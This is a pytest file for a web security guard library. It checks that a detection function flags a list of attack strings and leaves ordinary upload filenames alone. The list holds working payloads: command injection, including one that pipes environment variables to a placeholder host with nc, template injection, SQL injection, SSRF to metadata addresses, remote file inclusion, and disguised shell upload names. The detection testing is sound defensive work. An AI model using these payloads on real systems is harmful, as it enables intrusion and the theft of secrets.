import json
from collections.abc import Callable

import pytest

from guard_core.models import SyncSecurityConfig
from guard_core.sync.utils import detect_penetration_attempt
from tests.test_sync.conftest import SyncMockGuardRequest

PAYLOADS = [
    ("cmd_sleep", "x; sleep 10", "cmd_injection"),
    ("cmd_cmd_exe", "& cmd.exe /c dir", "cmd_injection"),
    ("cmd_powershell", "; powershell -enc SQBFAFgA", "cmd_injection"),
    ("cmd_env", ";env", "cmd_injection"),
    ("cmd_env_piped", "x; env | nc evil.example 4444", "cmd_injection"),
    ("cmd_newline_id", "x\nid", "cmd_injection"),
    ("cmd_encoded_newline_id", "x%0aid", "cmd_injection"),
    ("cmd_ping", "127.0.0.1; ping -c 10 evil.example.com", "cmd_injection"),
    ("crlf_encoded", "x%0d%0aSet-Cookie: a=b", "http_split"),
    ("jinja_config", "{{config.__class__.__init__.__globals__}}", "template"),
    ("jinja_self", "{{self.__init__.__globals__}}", "template"),
    ("jinja_lipsum", "{{lipsum.__globals__['os'].popen('id').read()}}", "template"),
    (
        "freemarker_execute",
        '<#assign ex="freemarker.template.utility.Execute"?new()>',
        "template",
    ),
    ("velocity_set", "#set($x=7*7)", "template"),
    (
        "velocity_runtime",
        "#set($rt=$x.getClass().forName('java.lang.Runtime'))",
        "template",
    ),
    ("spel_selection", "*{7*7}", "template"),
    ("spel_type", "*{T(java.lang.Runtime).getRuntime().exec('id')}", "template"),
    (
        "ognl_struts",
        "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@X)}",
        "template",
    ),
    ("yaml_python", "!!python/object/apply:os.system ['id']", "deserialization"),
    ("proto_constructor", '{"constructor":{"prototype":{"x":1}}}', "proto_pollution"),
    (
        "proto_constructor_assign",
        "a.constructor.prototype.isAdmin=true",
        "proto_pollution",
    ),
    ("rfi_null_terminated", "http://evil.example.com/shell.txt?", "file_inclusion"),
    (
        "sqli_extractvalue",
        "1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))",
        "sqli",
    ),
    ("sqli_updatexml", "1 AND UPDATEXML(1,CONCAT(0x7e,version()),1)", "sqli"),
    (
        "sqli_information_schema",
        "1 AND (SELECT COUNT(*) FROM information_schema.tables)>0",
        "sqli",
    ),
    (
        "sqli_blind_substring",
        "1 AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'",
        "sqli",
    ),
    ("sqli_blind_ascii", "1 AND ASCII(SUBSTR(user(),1,1))>64", "sqli"),
    ("ssrf_nip_io", "http://127.0.0.1.nip.io/", "ssrf"),
    ("ssrf_metadata_nip_io", "http://169.254.169.254.nip.io/", "ssrf"),
    ("ssrf_sslip_io", "http://10.0.0.5.sslip.io/admin", "ssrf"),
    ("upload_double_extension", "shell.php.jpg", "file_upload"),
    ("upload_trailing_dot", "shell.php.", "file_upload"),
    ("upload_semicolon", "shell.php;.jpg", "file_upload"),
]


def _query(value: str) -> SyncMockGuardRequest:
    return SyncMockGuardRequest(path="/s", query_params={"q": value})


def _json_body(value: str) -> SyncMockGuardRequest:
    body = json.dumps({"v": value}).encode()
    return SyncMockGuardRequest(
        method="POST",
        path="/s",
        headers={"content-type": "application/json", "content-length": str(len(body))},
        body_content=body,
    )


@pytest.mark.parametrize("surface", [_query, _json_body], ids=["query", "json"])
@pytest.mark.parametrize(
    ("value", "category"),
    [(value, category) for _name, value, category in PAYLOADS],
    ids=[name for name, _value, _category in PAYLOADS],
)
def test_standard_payload_is_detected(
    surface: Callable[[str], SyncMockGuardRequest], value: str, category: str
) -> None:
    result = detect_penetration_attempt(surface(value), SyncSecurityConfig())

    assert result.is_threat is True
    assert category in result.threat_categories


def _multipart(filename: str) -> SyncMockGuardRequest:
    boundary = "B"
    body = (
        f'--{boundary}\r\nContent-Disposition: form-data; name="file"; '
        f'filename="{filename}"\r\nContent-Type: image/jpeg\r\n\r\nGIF89a\r\n'
        f"--{boundary}--\r\n"
    ).encode()
    return SyncMockGuardRequest(
        method="POST",
        path="/up",
        headers={
            "content-type": f"multipart/form-data; boundary={boundary}",
            "content-length": str(len(body)),
        },
        body_content=body,
    )


@pytest.mark.parametrize(
    "filename", [".htaccess", ".htpasswd", "web.config", "shell.inc"]
)
def test_server_configuration_upload_names_are_flagged(filename: str) -> None:
    result = detect_penetration_attempt(_multipart(filename), SyncSecurityConfig())

    assert result.is_threat is True
    assert "file_upload" in result.threat_categories


@pytest.mark.parametrize("filename", ["photo.jpg", "report.pdf", "notes.config.pdf"])
def test_ordinary_upload_names_stay_clean(filename: str) -> None:
    result = detect_penetration_attempt(_multipart(filename), SyncSecurityConfig())

    assert result.is_threat is False
